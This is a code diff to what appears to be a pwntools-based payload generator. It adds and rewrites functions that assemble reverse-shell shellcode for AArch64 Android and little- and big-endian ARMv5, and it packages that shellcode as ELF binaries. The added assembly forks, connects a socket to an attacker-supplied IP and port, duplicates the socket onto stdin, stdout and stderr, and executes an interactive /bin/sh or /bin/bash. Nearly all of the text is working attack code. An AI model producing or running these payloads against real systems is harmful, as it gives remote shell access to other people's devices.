@@ -1034,6 +1034,7 @@ li   $v0,0x13c3
 syscall
 j _start
 nop
+
 	'''
 	if(filename==None):
 		log.info("waiting 3s")
@@ -1608,14 +1609,90 @@ def android_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filen
 	context.bits = '64'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
-	shell_path_list = []
 	if shell_path == "/bin/bash" or shell_path == "bash":
-		shell_path = "/system/bin/bash"
-		shell_path_list.append(shell_path)
-		shell_path_list.append("-i")
+		shellcode_execve = '''
+/* execve(path='/bin/bash', argv=['/bin/bash', '-i'], envp=0) */
+/* push b'/bin/bash\x00' */
+/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #25135, lsl #0x20
+movk x14, #29537, lsl #0x30
+mov  x15, #104
+stp x14, x15, [sp, #-16]!
+mov  x0, sp
+/* push argument array [b'/bin/bash\x00', b'-i\x00'] */
+/* push b'/bin/bash\x00-i\x00' */
+/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #25135, lsl #0x20
+movk x14, #29537, lsl #0x30
+/* Set x15 = 1764556904 = 0x692d0068 */
+mov  x15, #104
+movk x15, #26925, lsl #16
+stp x14, x15, [sp, #-16]!
+
+/* push null terminator */
+mov  x14, xzr
+str x14, [sp, #-8]!
+
+/* push pointers onto the stack */
+mov  x14, #18
+add x14, sp, x14
+sub sp, sp ,8
+str x14, [sp, #-8]!
+mov  x14, #24
+add x14, sp, x14
+sub sp, sp, 8
+stp x5, x14 , [sp, #-8]!
+
+add x1, sp, 8
+
+/* set x1 to the current top of the stack */
+mov  x2, xzr
+/* call execve() */
+mov  x8, #0xdd
+svc 0
+
+		'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
-		shell_path = "/system/bin/sh"
-		shell_path_list.append(shell_path)
+		shellcode_execve ='''
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #29487, lsl #0x20
+movk x14, #104, lsl #0x30
+str x14, [sp, #-16]!
+mov  x0, sp
+/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
+/* push b'/bin/sh\x00-i\x00' */
+/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #29487, lsl #0x20
+movk x14, #104, lsl #0x30
+mov  x15, #26925
+stp x14, x15, [sp, #-16]!
+
+/* push null terminator */
+mov  x14, xzr
+str x14, [sp, #-8]!
+
+/* push pointers onto the stack */
+mov  x14, #24
+add x14, sp, x14
+sub sp, sp, 8
+str x14, [sp, #0]! /* b'-i\x00' */
+
+mov x1, sp
+
+/* set x1 to the current top of the stack */
+mov  x2, xzr
+/* call execve() */
+mov  x8, #0xdd
+svc 0
+
+		'''
 	else:
 		log.info("now shell is only support sh and bash")
 		return 
@@ -1623,6 +1700,7 @@ def android_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filen
 		envp = 0
 	else:
 		envp = my_package.get_envir_args(envp)
+
 
 	shellcode = '''
 .section .shellcode,"awx"
@@ -1656,7 +1734,7 @@ mov x0,x12
 mov x1,#2
 svc #1337
 	'''
-	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
+	shellcode += shellcode_execve
 
 	shellcode += shellcraft.exit(0)
 
@@ -2161,6 +2239,585 @@ main_lab:
 				return 
 
 
+
+def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+	context.bits="32"
+	context.arch='arm'
+	context.endian='little'
+	shell_path_list = []
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode='''
+	.section .shellcode,"awx"
+	.global _start
+	.global __start
+	.p2align 2
+	_start:
+	__start:
+	.syntax unified
+	.arch armv7-a
+	.ARM
+	eor r4,r4,r4
+	%s
+	strb r7,[sp,#-0x28]
+	%s
+	strb r7,[sp,#-0x27]
+	%s
+	strb r7,[sp,#-0x26]
+	%s
+	strb r7,[sp,#-0x25]
+	mov r7,#2
+	strb r7,[sp,#-0x2c]
+	strb r4,[sp,#-0x2b]
+	%s
+	strb r7,[sp,#-0x2a]
+	%s
+	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x61
+	strb r7,[sp,#-0x17]
+	mov r7,#0x62
+	strb r7,[sp,#-0x18]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x19]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1b]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1c]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1d]
+	eor r7, r7
+	strb r7,[sp,#-0x1e]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1f]
+	mov r7,#0x2d
+	strb r7,[sp,#-0x20]
+	add r4,sp,#-0x1d
+	add r5,sp,#-0x2c
+	add r8,sp,#-0x20
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	main:
+	'''
+
+		shellcode += shellcraft.fork()
+
+		shellcode += '''
+	mov r3,r0
+	cmp r3,#0
+	bne main_lab
+	'''
+
+		shellcode +='''
+	mov r1,#2
+	mov r0,r1
+	mov r1,#1
+	eor r2,r2,r2
+	mov r7,#200
+	add r7,r7,#81
+	svc #1
+	mov r6,r0
+	mov r1,r5
+	mov r2,#0x10
+	add r7,r7,#2
+	svc #1
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	push {r1}
+	push {r0,r8}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+
+	'''
+
+		shellcode += shellcraft.exit(0)
+
+		shellcode += '''
+main_lab:
+	'''
+
+		shellcode += shellcraft.wait4("r3")
+
+		shellcode += '''
+b main
+nop
+	'''
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode='''
+	.section .shellcode,"awx"
+	.global _start
+	.global __start
+	.p2align 2
+	_start:
+	__start:
+	.syntax unified
+	.arch armv7-a
+	.ARM
+	.ARM
+	eor r4,r4,r4
+	%s
+	strb r7,[sp,#-0x28]
+	%s
+	strb r7,[sp,#-0x27]
+	%s
+	strb r7,[sp,#-0x26]
+	%s
+	strb r7,[sp,#-0x25]
+	mov r7,#2
+	strb r7,[sp,#-0x2c]
+	strb r4,[sp,#-0x2b]
+	%s
+	strb r7,[sp,#-0x2a]
+	%s
+	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x17]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x18]
+	mov r7,#0x69
+	strb r7,[sp,#-0x19]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1b]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1f]
+	mov r7,#0x2d
+	strb r7,[sp,#-0x20]
+	add r4,sp,#-0x1b
+	add r5,sp,#-0x2c
+	add r8,sp,#-0x20
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	main:
+	'''
+
+		shellcode += shellcraft.fork()
+
+		shellcode += '''
+	mov r3,r0
+	cmp r3,#0
+	bne main_lab
+	'''
+
+
+		shellcode += '''
+	mov r1,#2
+	mov r0,r1
+	mov r1,#1
+	eor r2,r2,r2
+	mov r7,#200
+	add r7,r7,#81
+	svc #1
+	mov r6,r0
+	mov r1,r5
+	mov r2,#0x10
+	add r7,r7,#2
+	svc #1
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	push {r1}
+	push {r0}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+
+	'''
+		shellcode += shellcraft.exit(0)
+
+		shellcode += '''
+main_lab:
+	'''
+
+		shellcode += shellcraft.wait4("r3")
+
+		shellcode += '''
+b main
+nop
+	'''
+
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
+	log.success("reverse_ip is set to "+ reverse_ip)
+	log.success("reverse_port is set to "+str(reverse_port))
+	handle_ip=reverse_ip.split('.')
+	handle_port=list(p16(reverse_port)[::-1])
+	for i in range(len(handle_ip)):
+		if handle_ip[i]!="0":
+			handle_ip[i]="mov r7,#"+handle_ip[i]
+		else:
+			handle_ip[i]="eor r7,r7,r7"
+	for i in range(len(handle_port)):
+		if handle_port[i]!="\x00":
+			handle_port[i]="mov r7,#"+str(handle_port[i])
+		else:
+			handle_port[i]="eor r7,r7,r7"
+
+	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
+	#print shellcode
+	#str(u8(handle_port[0])),str(u8(handle_port[1])
+	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
+	if(filename==None):
+		log.info("waiting 3s")
+		sleep(1)
+		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
+		my_package.my_make_elf(shellcode, filename)
+		log.success("{} is ok in current path ./".format(filename))
+		context.arch = 'i386'
+		context.bits = "32"
+		context.endian = "little"
+	else:
+		if(os.path.exists(filename) != True):
+			log.info("waiting 3s")
+			sleep(1)
+			my_package.my_make_elf(shellcode, filename)
+			log.success("{} generated successfully".format(filename))
+			context.arch='i386'
+			context.bits="32"
+			context.endian="little"
+		else:
+			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
+			choise = input()
+			if choise == "y\n" or choise == "\n":
+				log.info("waiting 3s")
+				sleep(1)
+				my_package.my_make_elf(shellcode, filename)
+				log.success("{} generated successfully".format(filename))
+				context.arch='i386'
+				context.bits="32"
+				context.endian="little"
+			else:
+				return 
+
+
+def armebv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+	context.bits="32"
+	context.arch='arm'
+	context.endian='big'
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode='''
+	.section .shellcode,"awx"
+	.global _start
+	.global __start
+	.p2align 2
+	_start:
+	__start:
+	.syntax unified
+	.arch armv7-a
+	.ARM
+	eor r4,r4,r4
+	%s
+	strb r7,[sp,#-0x28]
+	%s
+	strb r7,[sp,#-0x27]
+	%s
+	strb r7,[sp,#-0x26]
+	%s
+	strb r7,[sp,#-0x25]
+	mov r7,#2
+	strb r7,[sp,#-0x2b]
+	strb r4,[sp,#-0x2c]
+	%s
+	strb r7,[sp,#-0x2a]
+	%s
+	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x61
+	strb r7,[sp,#-0x17]
+	mov r7,#0x62
+	strb r7,[sp,#-0x18]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x19]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1b]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1c]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1d]
+	eor r7, r7
+	strb r7,[sp,#-0x1e]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1f]
+	mov r7,#0x2d
+	strb r7,[sp,#-0x20]
+	add r4,sp,#-0x1d
+	add r8,sp,#-0x20
+	add r5,sp,#-0x2c
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	main:
+	'''
+
+		shellcode += shellcraft.fork()
+
+		shellcode += '''
+	mov r3,r0
+	cmp r3,#0
+	bne main_lab
+	'''
+
+		shellcode += '''
+	mov r1,#2
+	mov r0,r1
+	mov r1,#1
+	eor r2,r2,r2
+	mov r7,#200
+	add r7,r7,#81
+	svc #1
+	mov r6,r0
+	mov r1,r5
+	mov r2,#0x10
+	add r7,r7,#2
+	svc #1
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	push {r1}
+	push {r0,r8}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+	'''
+		shellcode += shellcraft.exit(0)
+
+		shellcode += '''
+main_lab:
+	'''
+
+		shellcode += shellcraft.wait4("r3")
+
+		shellcode += '''
+b main
+nop
+	'''
+
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode = '''
+	.section .shellcode,"awx"
+	.global _start
+	.global __start
+	.p2align 2
+	_start:
+	__start:
+	.syntax unified
+	.arch armv7-a
+	.ARM
+	eor r4,r4,r4
+	%s
+	strb r7,[sp,#-0x28]
+	%s
+	strb r7,[sp,#-0x27]
+	%s
+	strb r7,[sp,#-0x26]
+	%s
+	strb r7,[sp,#-0x25]
+	mov r7,#2
+	strb r7,[sp,#-0x2b]
+	strb r4,[sp,#-0x2c]
+	%s
+	strb r7,[sp,#-0x2a]
+	%s
+	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x17]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x18]
+	mov r7,#0x69
+	strb r7,[sp,#-0x19]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1b]
+	eor r7, r7
+	strb r7,[sp,#-0x1e]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1f]
+	mov r7,#0x2d
+	strb r7,[sp,#-0x20]
+	add r8,sp,#-0x20
+	add r4,sp,#-0x1b
+	add r5,sp,#-0x2c
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	main:
+	'''
+
+		shellcode += shellcraft.fork()
+
+		shellcode += '''
+	mov r3,r0
+	cmp r3,#0
+	bne main_lab
+	'''
+
+
+		shellcode += '''
+	mov r1,#2
+	mov r0,r1
+	mov r1,#1
+	eor r2,r2,r2
+	mov r7,#200
+	add r7,r7,#81
+	svc #1
+	mov r6,r0
+	mov r1,r5
+	mov r2,#0x10
+	add r7,r7,#2
+	svc #1
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	push {r1}
+	push {r0}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+	'''
+
+		shellcode += shellcraft.exit(0)
+
+		shellcode += '''
+main_lab:
+	'''
+
+		shellcode += shellcraft.wait4("r3")
+
+		shellcode += '''
+b main
+nop
+	'''
+
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
+	log.success("reverse_ip is set to "+ reverse_ip)
+	log.success("reverse_port is set to "+str(reverse_port))
+	handle_ip=reverse_ip.split('.')
+	handle_port=list(p16(reverse_port)[::-1])
+	for i in range(len(handle_ip)):
+		if handle_ip[i]!="0":
+			handle_ip[i]="mov r7,#"+handle_ip[i]
+		else:
+			handle_ip[i]="eor r7,r7,r7"
+	for i in range(len(handle_port)):
+		if handle_port[i]!="\x00":
+			handle_port[i]="mov r7,#"+str(handle_port[i])
+		else:
+			handle_port[i]="eor r7,r7,r7"
+
+	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[1],handle_port[0])
+	#print shellcode
+	#str(u8(handle_port[0])),str(u8(handle_port[1])
+	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
+	
+	if(filename==None):
+		log.info("waiting 3s")
+		sleep(1)
+		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
+		my_package.my_make_elf(shellcode, filename)
+		log.success("{} is ok in current path ./".format(filename))
+		context.arch = 'i386'
+		context.bits = "32"
+		context.endian = "little"
+	else:
+		if(os.path.exists(filename) != True):
+			log.info("waiting 3s")
+			sleep(1)
+			my_package.my_make_elf(shellcode, filename)
+			log.success("{} generated successfully".format(filename))
+			context.arch='i386'
+			context.bits="32"
+			context.endian="little"
+		else:
+			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
+			choise = input()
+			if choise == "y\n" or choise == "\n":
+				log.info("waiting 3s")
+				sleep(1)
+				my_package.my_make_elf(shellcode, filename)
+				log.success("{} generated successfully".format(filename))
+				context.arch='i386'
+				context.bits="32"
+				context.endian="little"
+			else:
+				return 
 
 
 def x64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
